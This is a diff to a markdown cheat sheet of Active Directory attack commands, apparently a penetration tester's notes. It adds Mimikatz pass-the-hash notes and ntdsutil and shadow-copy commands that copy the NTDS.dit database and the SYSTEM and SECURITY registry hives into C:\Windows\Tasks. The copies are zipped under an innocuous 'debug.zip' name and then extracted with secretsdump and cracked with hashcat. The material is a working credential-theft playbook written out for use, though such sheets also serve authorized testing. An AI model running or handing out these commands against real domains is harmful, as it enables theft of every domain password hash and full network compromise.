@@ -248,6 +248,12 @@
    * `kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<ntlm> /ptt`
 * Pass-the-Hash
    * `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm> /run:"mstsc.exe /restrictedadmin"`
+   * Some notes about passing the hash with mstsc.exe:
+     * "Restricted Admin Mode" ensures that credentials are NOT stored in the LSASS memory on the remote server.
+       * Value 0 = Enabled
+       * Value 1 = Disabled
+     * However, if this setting is enabled, you CAN log in with an NTLM hash.
+     * This setting is not enabled by default on systems. So PTH doesn't work by default.
 * Over-Pass-The-Hash
    * `sekurlsa::pth /user:Administrator /domain:. /ntlm:<ntlm> /run:powershell`
 * PTT
@@ -392,12 +398,15 @@
 
 ## DCSync
 
-* Mimikatz
-   * `lsadump::dcsync /user:<domain><user>`
-   * `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain><user>"'`
 * Ntdsutil
-   * `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
-   * `Compress-Archive -Path C:\Temp\* -DestinationPath C:\Temp\dump.zip`
+   * `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\Tasks\' q q"`
+   * `Compress-Archive -Path C:\Windows\Tasks\* -DestinationPath C:\Windows\Tasks\debug.zip`
+* Shadow Copy
+  * `vssadmin.exe create shadow /for=C:`
+  * `cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Tasks\`
+  * `cmd /c copy  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Tasks\`
+  * `cmd /c copy  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Tasks\`
+  * `Compress-Archive -Path C:\Windows\Tasks\* -DestinationPath C:\Windows\Tasks\debug.zip`
 * SecretsDump
    * `secretsdump.py <domain>/<user>:<pass>@<target> -outputfile dump`
    * `secretsdump.exe <domain>/<user>:<pass>@<target> -outputfile dump`
@@ -406,7 +415,7 @@
 ## SecretsDump (local)
 
 * Local NTDS
-   * `secretsdump.py -system SYSTEM -ntds ntds.dit -outputfile dump LOCAL`
+   * `secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit -outputfile dump LOCAL`
 * Local SAM
    * Download local passwords
       * `reg save HKLM\SAM C:\Windows\Tasks\SAM`
@@ -676,6 +685,8 @@ Get-SQLQuery -Query "SELECT * FROM OPENQUERY(`"<remote_instance>`", 'select @@se
 
 ## Hashcat
 
+* Remove machine accounts
+   * `grep -F -v '$' dump.ntds.full > dump.ntds`
 * Cracking
    * `hashcat.bin -m 1000 dump.ntds mystery-list.txt -r OneRuleToRuleThemAll.rule`
 * LM incremental
